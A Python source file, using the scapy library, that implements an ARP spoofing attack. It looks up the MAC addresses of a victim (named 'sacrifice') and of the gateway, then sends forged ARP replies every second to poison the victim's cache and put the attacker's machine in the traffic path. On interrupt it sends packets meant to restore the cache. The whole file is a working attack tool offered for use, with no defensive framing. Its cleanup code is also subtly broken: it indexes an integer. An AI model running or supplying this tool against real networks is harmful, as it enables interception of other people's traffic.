from scapy.all import ARP, Ether, srp1, send
import sys
import time

class ArpSpoof:
    def __init__(self):

        self.arp_table = dict()
        self.in_ipaddr = 0
        self.in_name_mac = ("mac_sacrifice", "mac_gateway")


    def who_has(self, ip_sacrifice, ip_gateway):
        self.device = [ip_sacrifice, ip_gateway]

        for _ in range(2):
            arp_packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=self.device[self.in_ipaddr])
            arp_response = srp1(arp_packet, verbose=0)

            if arp_response:
                self.arp_table[self.in_name_mac[self.in_ipaddr]] = arp_response.hwsrc
                print(f"IP: {arp_response.psrc} MAC: {arp_response.hwsrc}")

            else:
                print(None)

            self.in_ipaddr += 1

        else:
            self.arp_table["mac_hacker"] = arp_packet.hwsrc


    def is_at(self):
            packet = ARP(op=2, pdst=self.device[0], hwdst=self.arp_table.get("mac_sacrifice"), psrc=self.device[1])

            try:

                while True:
                    send(packet, verbose=0)
                    print(f"{self.arp_table.get("mac_sacrifice")} {self.arp_table.get("mac_gateway")} is at {self.device[1]} {self.arp_table.get("mac_hacker")}\n")
                    time.sleep(1)

            except KeyboardInterrupt:
                packet_reced = ARP(op=2, pdst=self.device[0], hwdst=self.arp_table.get("mac_sacrifice"), psrc=self.device[1], hwsrc=self.arp_table.get("mac_gateway"))

                for _ in range(5):
                    send(packet_reced, verbose=0)
                    print(f"reced {self.in_ipaddr[1]} {self.arp_table.get("mac_gateway")} for arp-cache {self.device[0]}")
                    time.sleep(1)

                print()
                sys.exit()
                    


